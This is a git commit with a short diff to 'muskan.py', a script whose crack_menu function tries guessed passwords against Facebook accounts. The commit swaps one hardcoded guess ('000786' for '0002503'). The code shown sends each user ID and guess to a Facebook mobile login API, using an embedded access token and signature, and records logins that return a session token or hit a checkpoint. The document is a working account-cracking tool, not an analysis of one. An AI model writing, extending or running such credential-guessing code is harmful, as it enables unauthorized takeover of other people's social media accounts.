299c87685c747d53541931902e9eac6d7d9c6d56
Rakib-king <66826551+Rakib-king@users.noreply.github.com>
2021-05-12 11:51:27 +0600

    Update muskan.py

--- muskan.py
+++ muskan.py
@@ -288,7 +288,7 @@ def crack_menu():
 							crt.close()
 							checkpoint.append(user+pass2)
 						else:
-							pass3 = '000786'
+							pass3 = '0002503'
 							data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=" + user + "&locale=en_US&password=" + pass3 + "&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
 							q = json.load(data)
 							if "access_token" in q:
